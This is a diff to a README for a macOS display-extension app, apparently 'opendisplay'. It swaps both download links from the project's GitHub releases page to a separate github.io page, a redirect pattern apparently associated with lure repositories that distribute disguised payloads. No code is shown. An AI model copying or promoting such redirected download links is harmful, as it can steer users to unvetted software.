@@ -19,7 +19,7 @@ Think of it as your Mac's secret superpower: every Apple device you already own 
 
 ### Step 1: Get the App
 
-[![Download opendisplay Now](https://img.shields.io/badge/Download-opendisplay-2ea44f?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/melanthaantediluvian4896/opendisplay/releases)
+[![Download opendisplay Now](https://img.shields.io/badge/Download-opendisplay-2ea44f?style=for-the-badge&logo=apple&logoColor=white)](https://melanthaantediluvian4896.github.io)
 
 Visit this link to download the application. The download page will show you the latest version and available files.
 
@@ -103,7 +103,7 @@ You get a full-fledged second display experience without modifying your system, 
 
 Ready to expand your screen real estate?
 
-[Download opendisplay Now](https://github.com/melanthaantediluvian4896/opendisplay/releases)
+[Download opendisplay Now](https://melanthaantediluvian4896.github.io)
 
 After downloading, follow the simple installation steps above, and you'll be dual-screening within five minutes.
 
